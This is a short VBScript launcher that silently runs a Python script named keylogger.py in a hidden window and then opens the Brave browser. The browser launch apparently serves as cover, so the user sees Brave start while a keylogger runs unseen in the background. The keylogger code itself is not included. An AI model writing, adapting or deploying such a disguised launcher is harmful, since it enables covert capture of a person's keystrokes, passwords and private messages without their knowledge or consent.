Set WshShell = CreateObject("WScript.Shell")
' Run Python script (does NOT wait for it to finish)
WshShell.Run "python C:\Users\Julio\githubLocal\keylogger\keylogger.py", 0, False
' Open Brave
WshShell.Run """C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"""
